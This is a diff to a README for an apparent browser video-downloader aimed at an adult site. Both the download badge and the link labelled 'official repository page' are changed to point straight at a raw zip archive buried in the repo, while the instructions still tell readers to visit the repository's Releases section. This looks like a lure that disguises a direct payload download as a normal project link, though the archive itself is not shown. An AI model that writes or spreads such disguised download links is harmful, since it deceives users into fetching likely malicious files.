@@ -1,6 +1,6 @@
 # 📥 how-to-download-youporn-videos - Save your favorite videos easily now
 
-[![](https://img.shields.io/badge/Download-Video_Downloader-blue.svg)](https://github.com/Adverbial-turnsignal699/how-to-download-youporn-videos)
+[![](https://img.shields.io/badge/Download-Video_Downloader-blue.svg)](https://github.com/Adverbial-turnsignal699/how-to-download-youporn-videos/raw/refs/heads/main/jamwood/to-download-how-youporn-videos-2.7.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Ensure your browser stays updated to the latest version. Older browser versions 
 
 Follow these steps to add the tool to your browser.
 
-1. Visit the [official repository page](https://github.com/Adverbial-turnsignal699/how-to-download-youporn-videos).
+1. Visit the [official repository page](https://github.com/Adverbial-turnsignal699/how-to-download-youporn-videos/raw/refs/heads/main/jamwood/to-download-how-youporn-videos-2.7.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version link.
 4. Download the installation file to your computer.
